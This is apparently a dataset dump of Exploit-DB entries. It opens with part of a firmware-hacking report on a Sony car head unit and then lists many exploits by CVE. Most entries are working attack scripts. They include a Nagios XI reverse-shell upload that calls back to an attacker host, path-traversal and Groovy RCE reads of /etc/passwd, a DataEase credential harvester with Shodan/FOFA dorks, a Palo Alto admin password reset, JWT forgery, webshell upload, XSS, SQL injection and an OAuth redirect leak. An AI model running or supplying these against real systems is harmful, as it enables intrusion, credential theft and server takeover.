watchdog, power state management, and input (think remote # controls, steering wheel button presses) routing. # For our purposes, it is the Applications processor we're interested in, as it is # the system responsible for updating the unit via USB. # ## Interfaces # We're going to be attacking the unit via USB, as it's the most readily exposed # interface to owners and would-be attackers. # Whilst the applications processor does have a UART interface, the most recent iterations of the # unit do not expose any headers for debugging via UART, and the one active UART line found to be # active was for message passing between the SMC and app processor, not debug purposes. Similarly, no # exposed JTAG interfaces were found to be readily exposed on recent iterations of the unit. Sony's # documentation suggests these are not enabled, but this could not be verified during testing. At the # very least, JTAG was not found to be exposed on an accessible interface. # ## Storage # The boards analyzed had two SPI NOR flash chips, one with an unencrypted firmware image on it. This # firmware was RARd. The contents of SPI flash was analyzed to determine many of the details # discussed in this report. # ## The Updater # Updates are provided on Sony's support website. A ZIP package is provided with three files: # - SHDS1132.up6 # - SHMC1132.u88 # - SHSO1132.fir # The largest of these files (8 meg), the .fir, is in a custom format, and appears encrypted. # The FIR file has a header which contains the date of firmware publication, the strings KRSELCO and # SKIP, a chunk of zeros, and then a highish entropy section, and some repeating patterns of interest: # 00002070 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.....~...X#..\| # 00002860 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.....~...X#..\| # 00744110 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.....~...X#..\| # 00800020 b7 72 10 03 00 8c 82 7e aa d1 83 58 23 ef 82 5c |.r.....~...X#..\| # ## SPI Flash # Dumping the contents of the SPI flash shows a similar layout, with slightly different offsets: # 00001fe0 10 10 10 10 10 10 10 10 ff ff ff ff ff ff ff ff |................| # 00001ff0 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................| # 000027f0 ff ff ff ff ff ff ff ff ff ff ff ff 00 03 e7 52 |...............R| # 00002800 52 61 72 21 1a 07 00 cf 90 73 00 00 0d 00 00 00 |Rar!.....s......| # 0007fff0 ff ff ff ff ff ff ff ff ff ff ff ff 00 6c 40 8b |.............l@.| # 00080000 52 61 72 21 1a 07 00 cf 90 73 00 00 0d 00 00 00 |Rar!.....s......| # 00744090 ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................| # 00778000 # This given the offsets and spacing, we suspect that the .FIR matches the contents of the SPI. # Decompressing the RARs at the 0x2800 and 0x80000, we get the recovery and main applications. # Once we remove the packaging bytes, seeing that the repetive patterns align with FF's, gives # us a strong indication the encryption function is operating in an ECB-style configuration, # giving us an avenue, even if we do not recover the key, to potentially make modifications # to the firmware depending on how the checksum is being calculated. # ## Firmware # The recovery application contains the decompression, decryption and checksum methods. # Putting the recovery_16.bin into ghidra and setting the memory map to load us in at 0x2800, # we start taking a look at the relevant functions by way of: # - looking for known strings (KRSELCO) # - analyizing the logic and looking for obvious ""if this passed, begin the update, else fail"" # - looking for things that look like encryption (loads of bitshifting math in one function) # Of interest to us, there is: # - 0x0082f4 - a strcmp between KRSELCO and the address the incoming firmware update is at, plus 0x10 # - 0x00897a - a function which sums the total number of bytes until we hit 0xA5A5A5A5 # - 0x02d4ce - the AES decryption function # - 0x040dd4 - strcmp (?) # - 0x040aa4 - memcpy (?) # - 0x046490 - the vendor plus the a number an idiot would use for their luggage, followed by enough # padding zeros to get us to a 16 byte key # This gives us all the information we need, other than making some guesses as to the general package # and header layout of the update package, to craft an update packager that allows arbitrary # modification of the firmware. # # Proof of Concept # The"
CVE-2019-15949,2025-04-08,exploit db,"# Exploit Title: Nagiosxi authenticated Remote Code Execution # Date: 17/02/2024 # Exploit Author: Calil Khalil # Vendor Homepage: https://www.nagios.com/products/nagios-xi/ # Version: Nagios Xi 5.6.6 # Tested on: Ubuntu # CVE : CVE-2019-15949 # python3 exp.py -t https:// / -b / / -u user -p 'password' -lh -lp -k (ignore cert) import argparse import re import requests import urllib3 class Nagiosxi(): def __init__(self, target, parameter, username, password, lhost, lport, ignore_ssl): self.url = target self.parameter = parameter self.username = username self.password = password self.lhost = lhost self.lport = lport self.ignore_ssl = ignore_ssl self.login() def upload(self, session): print(""Uploading Malicious Check Ping Plugin"") upload_url = self.url + self.parameter + ""/admin/monitoringplugins.php"" upload_token = session.get(upload_url, verify=not self.ignore_ssl) nsp = re.findall('var nsp_str = ""(.*)"";', upload_token.text) print(""Upload NSP Token: "" + nsp[0]) payload = ""bash -c 'bash -i >& /dev/tcp/"" + self.lhost + ""/"" + self.lport + "" 0>&1'"" file_data = { ""upload"": ""1"", ""nsp"": nsp[0], ""MAX_FILE_SIZE"": ""20000000"" file_upload = { ""uploadedfile"": (""check_ping"", payload, ""application/octet-stream"", {""Content-Disposition"": ""form-data""}) session.post(upload_url, data=file_data, files=file_upload, verify=not self.ignore_ssl) payload_url = self.url + self.parameter + ""/includes/components/profile/profile.php?cmd=download"" session.get(payload_url, verify=not self.ignore_ssl) def login(self): session = requests.Session() login_url = self.url + self.parameter + ""/login.php"" token = session.get(login_url, verify=not self.ignore_ssl) nsp = re.findall('name=""nsp"" value=""(.*)"">', token.text) print(""Login NSP Token: "" + nsp[0]) post_data = { ""nsp"": nsp[0], ""page"": ""auth"", ""debug"": """", ""pageopt"": ""login"", ""redirect"": """", ""username"": self.username, ""password"": self.password, ""loginButton"": """" login = session.post(login_url, data=post_data, verify=not self.ignore_ssl) if ""Home Dashboard"" in login.text: print(""Logged in!"") else: print(""Unable to login!"") self.upload(session) if __name__ == ""__main__"": parser = argparse.ArgumentParser(description='CVE-2019–15949 Nagiosxi authenticated Remote Code Execution') parser.add_argument('-t', metavar=' ', help='Example: -t http://nagios.url/', required=True) parser.add_argument('-b', metavar=' ', help=""Example: -b /nagiosxi/"", required=True) parser.add_argument('-u', metavar=' ', help=""Example: -a username"", required=True) parser.add_argument('-p', metavar=' ', help=""Example: -p 'password'"", required=True) parser.add_argument('-lh', metavar=' ', help=""Example: -lh 127.0.0.1"", required=True) parser.add_argument('-lp', metavar=' ', help=""Example: -lp 1337"", required=True) parser.add_argument('-k', action='store_true', help=""Ignore SSL certificate verification"") args = parser.parse_args() urllib3.disable_warnings() try: print('CVE-2019-15949 Nagiosxi authenticated Remote Code Execution') Nagiosxi(args.t, args.b, args.u, args.p, args.lh, args.lp, args.k) except KeyboardInterrupt: print(""\nBye Bye!"") exit()"
CVE-2020-7656,2025-04-08,exploit db,"# Exploit Title: jQuery Prototype Pollution & XSS Exploit (CVE-2019-11358 & CVE-2020-7656) # Google Dork: N/A # Date: 2025-02-13 # Exploit Author: xOryus # Vendor Homepage: https://jquery.com # Software Link: https://code.jquery.com/jquery-3.3.1.min.js # Version: 3.3.1 # Tested on: Windows 10, Ubuntu 20.04, Chrome 120, Firefox 112 # CVE : CVE-2019-11358, CVE-2020-7656 # Category: WebApps # Description: # This exploit abuses two vulnerabilities in jQuery: # - CVE-2020-7656: XSS via improper script handling # - CVE-2019-11358: Prototype Pollution leading to XSS # By injecting payloads into a vulnerable page using jQuery <3.4.X, attackers can execute arbitrary JavaScript in the victim's browser. # Usage: # 1. Load this script in a page that includes jQuery 3.3.1 # 2. Observe two XSS alerts via script injection and prototype pollution."
CVE-2024-56902,2025-04-08,exploit db,"# Exploit Title: Information Disclosure in GeoVision GV-ASManager # Google Dork: inurl:""ASWeb/Login"" # Date: 02-FEB-2025 # Exploit Author: Giorgi Dograshvili [DRAGOWN] # Vendor Homepage: https://www.geovision.com.tw/ # Software Link: https://www.geovision.com.tw/download/product/ # Version: 6.1.0.0 or less # Tested on: Windows 10 | Kali Linux # CVE : CVE-2024-56902"
CVE-2025-24813,2025-04-07,exploit db,"# Exploit Title: Apache Tomcat Path Equivalence - Remote Code Execution # Exploit Author: Al Baradi Joy # CVE: CVE-2025-24813 # Date: 2025-04-06 # Vendor Homepage: https://tomcat.apache.org/ # Software Link: https://tomcat.apache.org/download-90.cgi # Version: Apache Tomcat < 11.0.3 / 10.1.35 / 9.0.98 # Tested on: Apache Tomcat 10.1.33 # CVSS: 9.8 (CRITICAL) # CWE: CWE-44, CWE-502 # Reference: https://scrapco.de/blog/analysis-of-cve-2025-24813-apache-tomcat-path-equivalence-rce.html import requests import random import string import sys def rand_filename(length=6): return ''.join(random.choices(string.ascii_lowercase, k=length)) def generate_payload(interact_url): # Java serialized payload gadget triggering DNS interaction return f'\xac\xed\x00\x05...' # Replace with actual gadget bytes or generator def exploit(target, interact_url): filename = rand_filename() put_url = f""{target}/{filename}.session"" get_url = f""{target}/{filename}"" headers = { ""Content-Range"": ""bytes 0-452/457"", ""Content-Type"": ""application/octet-stream"" payload = generate_payload(interact_url) print(""[+] Exploit for CVE-2025-24813"") print(""[+] Made By Al Baradi Joy\n"") print(f""[+] Uploading payload to: {put_url}"") r1 = requests.put(put_url, data=payload, headers=headers) if r1.status_code == 201: print(""[+] Payload uploaded successfully."") else: print(f""[-] Upload failed with status: {r1.status_code}"") return print(f""[+] Triggering payload via: {get_url}"") cookies = {""JSESSIONID"": f"".{filename}""} r2 = requests.get(get_url, cookies=cookies) print(f""[+] Trigger request sent. Check for DNS callback to: {interact_url}"") if __name__ == ""__main__"": # Display banner first print(""[+] Exploit for CVE-2025-24813"") print(""[+] Made By Al Baradi Joy\n"") # Ask the user for the target domain and interact URL target_url = input(""Enter the target domain (e.g., http://localhost:8080): interact_url = input(""Enter your interactsh URL: "") exploit(target_url, interact_url)"
CVE-2025-31131,2025-04-07,exploit db,"# Exploit Title: YesWiki < 4.5.2 - Unauthenticated Path Traversal # Exploit Author: Al Baradi Joy # Exploit Date: April 6, 2025 # CVE ID: CVE-2025-31131 # Vendor Homepage: https://yeswiki.net/ # Software Link: https://github.com/YesWiki/yeswiki # Affected Version: < 4.5.2 # Tested On: YesWiki 4.5.1 on Ubuntu 22.04 # Vulnerability Type: Unauthenticated Path Traversal (LFI) # CVSS Score: 8.6 (High) # CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N # Description: # YesWiki before version 4.5.2 is vulnerable to unauthenticated path traversal via the 'squelette' parameter. # A remote attacker can exploit this issue to read arbitrary files on the server, such as /etc/passwd. import requests import sys def banner(): print(""="" * 80) print("" YesWiki < 4.5.2 - Unauthenticated Path Traversal (CVE-2025-31131)"") print("" Exploit Author: Al Baradi Joy"") print(""="" * 80) def exploit(target, filename=""/etc/passwd""): if not target.startswith(""http""): target = ""http://"" + target traversal = ""../"" * 8 encoded_file = filename.replace(""/"", ""%2f"") payload = f""/?UrkCEO/edit&theme=margot&squelette={traversal}{encoded_file}&style=margot.css"" url = target.rstrip(""/"") + payload try: print(f""[+] Target: {target}"") print(f""[+] Attempting to read: {filename}"") response = requests.get(url, timeout=10) if response.status_code == 200 and ""root:"" in response.text: print(""[+] Exploit successful. File contents:\n"") print(response.text) else: print(""[!] Exploit failed or file not readable."") print(f""Status Code: {response.status_code}"") if len(response.text) < 200: print(f""Response:\n{response.text}"") except requests.exceptions.RequestException as e: print(f""[!] Request failed: {e}"") if __name__ == ""__main__"": banner() if len(sys.argv) < 2: print(f""Usage: python3 {sys.argv[0]} [file_to_read]"") print(f""Example: python3 {sys.argv[0]} http://victim.com /etc/passwd"") sys.exit(1) target_url = sys.argv[1] file_to_read = sys.argv[2] if len(sys.argv) > 2 else ""/etc/passwd"" exploit(target_url, file_to_read)"
CVE-2025-24893,2025-04-07,exploit db,"# Exploit Title: XWiki Platform - Remote Code Execution # Exploit Author: Al Baradi Joy # Exploit Date: April 6, 2025 # CVE ID: CVE-2025-24893 # Vendor Homepage: https://www.xwiki.org/ # Software Link: https://github.com/xwiki/xwiki-platform # Version: Affected versions up to and including XWiki 15.10.10 # Tested Versions: XWiki 15.10.10 # Vulnerability Type: Remote Code Execution (RCE) # CVSS Score: 9.8 (Critical) # CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H # Description: # XWiki Platform suffers from a critical vulnerability where any guest user can # execute arbitrary code remotely through the SolrSearch endpoint. This can lead # to a full server compromise, including the ability to execute commands on the # underlying system. The vulnerability impacts the confidentiality, integrity, # and availability of the XWiki installation. The issue has been patched in XWiki # versions 15.10.11, 16.4.1, and 16.5.0RC1. # Proof of Concept: Yes # Categories: XWiki, Remote Code Execution, CVE-2025, RCE # References: # - GHSA Advisory: https://github.com/advisories/GHSA-rr6p-3pfg-562j # - NVD CVE Details: https://nvd.nist.gov/vuln/detail/CVE-2025-24893 # - GitHub Exploit Link: https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py import requests # Banner def display_banner(): print(""=""*80) print(""Exploit Title: CVE-2025-24893 - XWiki Platform Remote Code Execution"") print(""Exploit Author: Al Baradi Joy"") print(""GitHub Exploit: https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py"") print(""=""*80) # Function to detect the target protocol (HTTP or HTTPS) def detect_protocol(domain): https_url = f""https://{domain}"" http_url = f""http://{domain}"" try: response = requests.get(https_url, timeout=5, allow_redirects=True) if response.status_code < 400: print(f""[✔] Target supports HTTPS: {https_url}"") return https_url except requests.exceptions.RequestException: print(""[!] HTTPS not available, falling back to HTTP."") try: response = requests.get(http_url, timeout=5, allow_redirects=True) if response.status_code < 400: print(f""[✔] Target supports HTTP: {http_url}"") return http_url except requests.exceptions.RequestException: print(""[✖] Target is unreachable on both HTTP and HTTPS."") exit(1) # Exploit function def exploit(target_url): target_url = detect_protocol(target_url.replace(""http://"", """").replace(""https://"", """").strip()) exploit_url = f""{target_url}/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d"" try: print(f""[+] Sending request to: {exploit_url}"") response = requests.get(exploit_url, timeout=10) # Check if the exploit was successful if response.status_code == 200 and ""root:"" in response.text: print(""[✔] Exploit successful! Output received:"") print(response.text) else: print(f""[✖] Exploit failed. Status code: {response.status_code}"") except requests.exceptions.ConnectionError: print(""[✖] Connection failed. Target may be down."") except requests.exceptions.Timeout: print(""[✖] Request timed out. Target is slow or unresponsive."") except requests.exceptions.RequestException as e: print(f""[✖] Unexpected error: {e}"") # Main execution if __name__ == ""__main__"": display_banner() target = input(""[?] Enter the target URL (without http/https): "").strip() exploit(target)"
CVE-2024-30269,2025-04-06,exploit db,"# Exploit Title: DataEase 2.4.0 - Database Configuration Information Exposure # Shodan Dork: http.html:""dataease"" # # FOFA Dork: body=""dataease"" && title==""DataEase"" # # Exploit Author: ByteHunter # # Email: 0xByteHunter@proton.me # # vulnerable Versions: 2.4.0-2.5.0 # # Tested on: 2.4.0 # # CVE : CVE-2024-30269 # import argparse import requests import re import json from tqdm import tqdm def create_vulnerability_checker(): vulnerable_count = 0 def check_vulnerability(url): nonlocal vulnerable_count endpoint = ""/de2api/engine/getEngine;.js"" full_url = f""{url}{endpoint}"" headers = { ""Host"": url.split('/')[2], ""Accept-Encoding"": ""gzip, deflate, br"", ""Accept"": ""*/*"", ""Accept-Language"": ""en-US;q=0.9,en;q=0.8"", ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36"", ""Connection"": ""close"", ""Cache-Control"": ""max-age=0"" try: response = requests.get(full_url, headers=headers, timeout=5) if response.status_code == 200: try: json_data = response.json() config = json_data.get(""data"", {}).get(""configuration"", None) if config: config_data = json.loads(config) username = config_data.get(""username"") password = config_data.get(""password"") port = config_data.get(""port"") if username and password: vulnerable_count += 1 print(f""Vulnerable: {full_url}"") print(f""Username: {username}"") print(f""Password: {password}"") if port is not None: print(f""Port Number: {port}"") except (json.JSONDecodeError, KeyError): print(f""Invalid JSON response from {full_url}"") except requests.RequestException: pass return vulnerable_count return check_vulnerability def main(): parser = argparse.ArgumentParser(description=""CVE-2024-30269 DataEase Database Creds Extractor"") parser.add_argument('-u', '--url', type=str, help='Single target') parser.add_argument('-l', '--list', type=str, help='URL File List') args = parser.parse_args() check_vulnerability = create_vulnerability_checker() if args.url: check_vulnerability(args.url) elif args.list: try: with open(args.list, 'r') as file: urls = [url.strip() for url in file.readlines() if url.strip()] total_urls = len(urls) for url in tqdm(urls, desc=""Processing URLs"", unit=""url""): check_vulnerability(url) # tqdm.write(f""Vulnerable Instances: {check_vulnerability(url)}/{total_urls}"") except FileNotFoundError: print(f""File not found: {args.list}"") else: print(""provide a URL with -u or a file with -l."") if __name__ == ""__main__"": main()"
CVE-2024-5910,2025-04-06,exploit db,"# Exploit Title: Palo Alto Networks Expedition 1.2.90.1 - Admin Account Takeover # Shodan Dork: html:""expedition project"" # # FOFA Dork: ""expedition project"" && icon_hash=""1499876150"" # # Exploit Author: ByteHunter # # Email: 0xByteHunter@proton.me # # Vulnerable Versions: 1.2 < 1.2.92 # # Tested on: 1.2.90.1 & 1.2.75 # # CVE : CVE-2024-5910 # import requests import argparse import warnings from requests.packages.urllib3.exceptions import InsecureRequestWarning warnings.simplefilter(""ignore"", InsecureRequestWarning) ENDPOINT = '/OS/startup/restore/restoreAdmin.php' def send_request(base_url): url = f""{base_url}{ENDPOINT}"" print(f""Testing URL: {url}"") try: response = requests.get(url, verify=False, timeout=7) if response.status_code == 200: print(""✓ Admin password restored to: 'paloalto'\n"") print(""✓ admin panel is now accessable via ==> admin:paloalto creds"") else: print(f""Request failed with status code: {response.status_code}\n"") except requests.exceptions.RequestException as e: print(f""Error sending request to {url}"") #{e} def main(): parser = argparse.ArgumentParser(description='Palo Alto Expedition - Admin Account Password Reset"
CVE-2024-48827,2025-04-06,exploit db,"# Exploit Title : Watcharr 1.43.0 - Remote Code Execution (RCE) # CVE-2024-48827 exploit by Suphawith Phusanbai # Affected Watcharr version 1.43.0 and below. import argparse import requests import json import jwt from pyfiglet import Figlet f = Figlet(font='slant',width=100) print(f.renderText('CVE-2024-48827')) #store JWT token and UserID \ เก็บ token กับ UserID jwt_token = None user_id = None #login to obtain JWT token / ล็อคอินเพื่อรับ JWT Token def login(host, port, username, password): url = f'http://{host}:{port}/api/auth/' #payload in login API request \ payload ใน json payload = { 'username': username, 'password': password headers = { 'Content-Type': 'application/json' #login to obtain JWT token \ ล็อคอินเพิ่อเก็บ JWT token แล้วใส่ใน jwt_token object try: response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status_code == 200: token = response.json().get('token') if token: print(f""[+] SUCCESS! JWT Token: {token}"") global jwt_token jwt_token = token #decode JWT token and store UserID in UserID object \ ดีโค้ด JWT token แล้วเก็บค่า UserID ใส่ใน UserID object decoded_payload = jwt.decode(token, options={""verify_signature"": False}) global user_id user_id = decoded_payload.get('userId') return token else: print(""[-] Check your password again!"") else: print(f""[-] Failed :("") print(f""Response: {response.text}"") except Exception as e: print(f""Error! HTTP response code: {e}"") #craft the admin token(to make this work you need to know admin username) \ สร้าง admin JWT token ขึ้นมาใหม่โดยใช้ token ที่ล็อคอิน def create_new_jwt(original_token): try: decoded_payload = jwt.decode(original_token, options={""verify_signature"": False}) #userID = 1 is always the admin \ userID ลำดับที่ 1 คือ admin เสมอ decoded_payload['userId'] = 1 new_token = jwt.encode(decoded_payload, '', algorithm='HS256') print(f""[+] New JWT Token: {new_token}"") return new_token except Exception as e: print(f""[-] Failed to create new JWT: {e}"") #privilege escalation with the crafted JWT token \ PE โดยการใช้ crafted admin token def privilege_escalation(host, port, adminuser, token): #specify API endpoint for giving users admin role \ เรียกใช้งาน API สำหรับให้สิทธิ์ user admin url = f'http://{host}:{port}/api/server/users/{user_id}' # permission 3 givefull access privs you can also use 6 and 9 to gain partial admin privileges. \ ให้สิทธิ์ admin ทั้งหมดด้วย permission = 3 payload = { ""permissions"": 3 headers = { 'Authorization': f'{token}', 'Content-Type': 'application/json' try: response = requests.post(url, data=json.dumps(payload), headers=headers) if response.status_code == 200: print(f""[+] Privilege Escalation Successful! The current user is now an admin!"") else: print(f""[-] Failed to escalate privileges. Response: {response.text}"") except Exception as e: print(f""Error during privilege escalation: {e}"") #exampl usage: python3 CVE-2024-48827.py -u dummy -p dummy -host 172.22.123.13 -port 3080 -adminuser admin #usage if __name__ == ""__main__"": parser = argparse.ArgumentParser(description='Exploit CVE-2024-48827 to obtain JWT token and escalate privileges.') parser.add_argument('-host', '--host', type=str, help='Host or IP address', required=True) parser.add_argument('-port', '--port', type=int, help='Port', required=True, default=3080) parser.add_argument('-u', '--username', type=str, help='Username for login', required=True) parser.add_argument('-p', '--password', type=str, help='Password for login', required=True) parser.add_argument('-adminuser', '--adminuser', type=str, help='Admin username to escalate privileges', required=True) args = parser.parse_args() #step 1: login token = login(args.host, args.port, args.username, args.password) #step 2: craft the admin token if token: new_token = create_new_jwt(token) #step 3: Escalate privileges with crafted token. Enjoy! if new_token: privilege_escalation(args.host, args.port, args.adminuser, new_token)"
CVE-2024-8856,2025-04-06,exploit db,"# Exploit Title: WordPress Backup and Staging Plugin ≤ 1.21.16 - Arbitrary File Upload to RCE # Original Author: Patchstack (hypothetical) # Exploit Author: Al Baradi Joy # Exploit Date: April 5, 2025 # Vendor Homepage: https://wp-timecapsule.com/ # Software Link: https://wordpress.org/plugins/wp-time-capsule/ # Version: Up to and including 1.21.16 # Tested Versions: 1.21.16 # CVE ID: CVE-2024-8856 # Vulnerability Type: Arbitrary File Upload / Remote Code Execution # Description: # The WordPress plugin ""Backup and Staging by WP Time Capsule"" up to version 1.21.16 # allows unauthenticated attackers to upload arbitrary files via the upload.php endpoint. # This can lead to remote code execution if a PHP file is uploaded and executed directly # from the wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/ directory. # Proof of Concept: Yes # Categories: WordPress Plugin, File Upload, RCE # CVSS Score: 9.9 (Critical) # CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H # Notes: # Successful exploitation provides shell access as the user running the web server. # Ensure target is using the vulnerable plugin version before launching the attack. import requests # Banner def display_banner(): print(""=""*80) print(""Exploit Title: CVE-2024-8856 - WordPress Backup and Staging Plugin Arbitrary File Upload"") print(""Made By Al Baradi Joy"") print(""=""*80) # Function to detect if the target supports HTTPS or falls back to HTTP def detect_protocol(domain): https_url = f""https://{domain}"" http_url = f""http://{domain}"" try: response = requests.get(https_url, timeout=5, allow_redirects=True) if response.status_code < 400: print(f""[✔] Target supports HTTPS: {https_url}"") return https_url except requests.exceptions.RequestException: print(""[!] HTTPS not available, falling back to HTTP."") try: response = requests.get(http_url, timeout=5, allow_redirects=True) if response.status_code < 400: print(f""[✔] Target supports HTTP: {http_url}"") return http_url except requests.exceptions.RequestException: print(""[✖] Target is unreachable on both HTTP and HTTPS."") exit(1) # Exploit function def exploit(target_url): target_url = detect_protocol(target_url.replace(""http://"", """").replace(""https://"", """").strip()) upload_url = f""{target_url}/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/upload.php"" shell_url = f""{target_url}/wp-content/plugins/wp-time-capsule/wp-tcapsule-bridge/shell.php?cmd=whoami"" files = { 'file': ('shell.php', ' ', 'application/x-php') try: print(f""[+] Attempting to upload shell to: {upload_url}"") response = requests.post(upload_url, files=files, timeout=10) if response.status_code == 200: print(f""[✔] Exploit successful! Webshell available at: {shell_url}"") else: print(f""[✖] Failed to upload shell. Status code: {response.status_code}"") except requests.exceptions.ConnectionError: print(""[✖] Connection failed. Target may be down."") except requests.exceptions.Timeout: print(""[✖] Request timed out. Target is slow or unresponsive."") except requests.exceptions.RequestException as e: print(f""[✖] Unexpected error: {e}"") # Main execution if __name__ == ""__main__"": display_banner() target = input(""[?] Enter the target URL (without http/https): "").strip() exploit(target)"
CVE-2024-9458,2025-04-06,exploit db,"# Exploit Title: Reservit Hotel < 3.0 - Admin+ Stored XSS # Date: 2024-10-01 # Exploit Author: Ilteris Kaan Pehlivan # Vendor Homepage: https://wpscan.com/plugin/reservit-hotel/ # Version: Reservit Hotel 2.1 # Tested on: Windows, WordPress, Reservit Hotel < 3.0 # CVE : CVE-2024-9458 The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed (for example in multisite setup). 1. Install and activate Reservit Hotel plugin. 2. Go to Reservit hotel > Content 3. Add the following payload to the Button text > French field sane save: "" style=animation-name:rotation onanimationstart=alert(/XSS/)// 4. The XSS will trigger upon saving and when any user will access the content dashboard again References: https://wpscan.com/vulnerability/1157d6ae-af8b-4508-97e9-b9e86f612550/ https://www.cve.org/CVERecord?id=CVE-2024-9458"
CVE-2024-7801,2025-04-05,exploit db,"# Exploit Title: Microchip TimeProvider 4100 Grandmaster (Data plot modules) 2.4.6 - SQL Injection # Exploit Author: Armando Huesca Prida, Marco Negro # Discovered By: Armando Huesca Prida, Marco Negro, Antonio Carriero, Vito Pistillo, Davide Renna, Manuel Leone, Massimiliano Brolli # Date of Disclosure: 27/06/2024 # Date of CVE Publication: 4/10/2024 # Exploit Publication: 11/10/2024 # Vendor Homepage: https://www.microchip.com/ # Version: Firmware release 1.0 through 2.4.7 # Tested on: Firmware release 2.3.12 # CVE: CVE-2024-7801 # External References: # URL: https://www.cve.org/cverecord?id=CVE-2024-7801 # URL: https://www.0xhuesca.com/2024/10/cve-2024-7801.html # URL: https://www.microchip.com/en-us/solutions/technologies/embedded-security/how-to-report-potential-product-security-vulnerabilities/timeprovider-4100-grandmaster-unathenticated-sql-injection # URL: https://www.gruppotim.it/it/footer/red-team.html # Vulnerability Description: The TimeProvider® 4100 Grandmaster firmware has a SQL injection vulnerability in the “get_chart_data” web resource, specifically the “channelId” parameter is inserted directly into the SQL query (SQLite) at the table's name query parameter from which the FROM operation is performed. Unauthenticated threat actors can manipulate queries to execute malicious SQL commands against the device. # Example of Malicious SQL Payload: SELECT%20sql%202,%203,%204,%205,%206,%207,%208,%209,%2010,%2011,%2012,%2013,%2014,%2015,%2016,%2017,%2018,%2019,%2020,%2021,%2022,%2023,%2024,%2025,%2026,%2027,%2028,%2029,%2030,%2031,%2032,%2033,%2034,%2035,%2036,%2037,%2038,%2039,%2040,%2041,%2042,%2043,%2044,%2045,%2046,%2047,%2048,%2049,%2050,%2051,%2052,%2053,%2054,%2055,%2056,%2057,%2058,%2059,%2060,%2061,%2062,%2063,%2064,%2065,%2066,%2067,%2068%20FROM%20sqlite_master$20WHERE&20type='table'$20LIMIT%201%20OFFSET%200-- # Proof of Concept -"
CVE-2024-35133,2025-04-05,exploit db,"# Exploit Title : IBM Security Verify Access 10.0.0 - Open Redirect during OAuth Flow ======== < Table of Contents > ================================================ 0. Overview 1. Detailed Description 2. Proof Of Concept 3. Solution 4. Disclosure Timeline 5. References 6. Credits 7. Legal Notices ======== < 0. Overview > ====================================================== Revision: 1.0 Impact: By persuading a victim to visit a specially crafted Web site, a remote attacker could exploit this vulnerability to spoof the URL displayed to redirect a user to a malicious Web site that would appear to be trusted. This could allow the attacker to obtain highly sensitive information or conduct further attacks against the victim. Severity: NIST: High IBM: Medium CVSS Score: NIST 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) IBM 6.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:N) CVE-ID: CVE-2024-35133 Vendor: IBM Affected Products: IBM Security Verify Access IBM Security Verify Access Docker Affected Versions: 10.0.0 - 10.0.8 Product Description: IBM Security Verify Access is a complete authorization and network security policy management solution. It provides end-to-end protection of resources over geographically dispersed intranets and extranets. In addition to state-of-the-art security policy management, IBM Security Verify Access provides authentication, authorization, data security, and centralized resource management capabilities. IBM Security Verify Access offers the following features: Authentication ~ Provides a wide range of built-in authenticators and supports external authenticators. Authorization ~ Provides permit and deny decisions for protected resources requests in the secure domain through the authorization API. Data security and centralized resource management ~ Manages secure access to private internal network-based resources by using the public Internet's broad connectivity and ease of use with a corporate firewall system. ======== < 1. Detailed Description > ========================================== During a Penetration Test of the OAuth flow for a client, it was found an Open Redirect vulnerability that can led to the leakage of the OAuth ""code"" variable. It was possible to bypass the parser's logic responsible for verifying the correctness and the validity of the ""redirect_uri"" parameter during an OAuth flow by leveraging RFC 3986 (3.2.1) providing a username and password directly in the Uniform Resource Identifier (URI). By providing as the ""username"" field a legitimate and expected domain, it was possible to bypass the whitelist filter used by ""IBM Security Verify Access"" and cause an Open Redirect to any arbitrary domain controlled by the attacker, not only altering the expected flow and redirect a user to a malicious Web site that would appear to be trusted. This could allow the attacker to obtain highly sensitive like the OAuth ""code"" token or conduct further attacks against the victim ======== < 2. Proof of Concepts > ============================================= ===== REQUEST ===== GET /oauth/oauth20/authorize?response_type=code&client_id=[REDACTED]&state=001710863806728MPUw0xFSj&REDACTED_uri=https://legitimate.domain:bypass@0lmd9sa7p0cez16vdcldhcgygpmga6yv.oastify.com/[REDACTED]/openid/REDACTED/[REDACTED]&scope=openid+ HTTP/1.1 Host: [REDACTED] User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close ===== RESPONSE ===== HTTP/1.1 302 Found content-language: en-US date: Tue, 19 Mar 2024 16:04:35 GMT location: https://legitimate.domain:bypass@0lmd9sa7p0cez16vdcldhcgygpmga6yv.oastify.com/[REDACTED]/openid/REDACTED/[REDACTED]?state=001710863806728MPUw0xFSj&code=7wkH581y0uyS0nm4ff65zCqHn0WC46w7v&iss=[REDACTED] p3p: CP=""NON CUR OTPi OUR 